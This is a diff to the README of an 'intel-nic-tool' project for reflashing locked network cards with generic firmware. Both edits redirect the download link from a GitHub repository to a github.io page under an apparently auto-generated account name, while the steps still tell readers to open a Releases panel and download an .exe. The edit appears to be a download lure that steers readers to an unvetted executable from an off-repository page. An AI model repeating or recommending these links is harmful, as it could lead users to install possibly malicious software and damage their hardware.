@@ -1,6 +1,6 @@
 # 🌐 intel-nic-tool - Convert locked hardware to generic firmware
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Partitive-paroxetime994/intel-nic-tool)
+[![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue)](https://partitive-paroxetime994.github.io)
 
 ## 🛠 What this tool does
 
@@ -22,7 +22,7 @@ To use this tool, your computer needs the following:
 
 You download the tool directly from the project release page. Ensure you follow the steps below to find the correct file.
 
-1. Visit this page to download: [https://github.com/Partitive-paroxetime994/intel-nic-tool](https://github.com/Partitive-paroxetime994/intel-nic-tool)
+1. Visit this page to download: [https://partitive-paroxetime994.github.io](https://partitive-paroxetime994.github.io)
 2. Locate the section marked Releases on the right side of the page.
 3. Click the most recent version tag.
 4. Select the file ending in .exe to start your download.
